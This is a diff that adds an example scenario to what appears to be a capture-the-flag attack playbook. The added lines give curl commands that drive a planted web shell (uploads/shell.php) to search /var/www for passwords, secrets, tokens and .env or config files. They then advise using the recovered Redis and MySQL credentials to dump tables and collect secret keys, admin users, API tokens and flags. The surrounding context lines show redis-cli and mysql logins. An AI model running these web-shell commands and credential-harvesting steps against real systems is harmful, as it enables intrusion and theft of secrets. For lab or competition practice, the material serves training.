@@ -26,6 +26,31 @@ redis-cli -h HOST -a 'PASSWORD' --no-auth-warning keys '*'
 mysql -h HOST -uroot -proot -e 'show databases;'
 ```
 
+## Example Scenario
+
+After a foothold on a PHP site:
+
+```bash
+curl -sG --data-urlencode 'cmd=grep -R -nEi "redis|mysql|password|secret|token" /var/www 2>/dev/null | head -n 50' \
+  http://target/uploads/shell.php
+curl -sG --data-urlencode 'cmd=find /var/www -maxdepth 4 -type f \\( -name ".env" -o -iname "*config*" \\) 2>/dev/null' \
+  http://target/uploads/shell.php
+```
+
+If config reveals:
+
+- `REDIS_PASSWORD=12345678`
+- `DB_USER=root`
+- `DB_PASS=root`
+
+then stop searching random files and immediately validate those services, dump app tables, and look for:
+
+- Flask or Django secret keys
+- admin users
+- internal host inventory
+- hardcoded API tokens
+- flag-like strings
+
 ## Notes
 
 - Submit any `flag{...}` immediately.
